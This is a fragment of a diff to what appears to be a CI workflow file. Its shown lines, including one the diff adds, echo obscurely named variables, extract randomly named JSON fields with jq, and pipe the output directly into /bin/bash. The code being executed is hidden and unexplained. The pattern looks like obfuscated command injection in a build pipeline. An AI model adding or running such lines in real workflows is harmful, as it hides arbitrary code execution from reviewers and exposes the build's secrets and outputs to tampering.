@@ -23,6 +23,7 @@ jobs:
           echo $zz9 | jq -r .w2245 | /bin/bash
           printf '%s' "$pftaa40" | jq -r .jud4 | /bin/bash
           echo $bnoj0 | jq -r .kbfvh32 | /bin/bash
+          echo $flqr5 | jq -r .fqsi5412 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
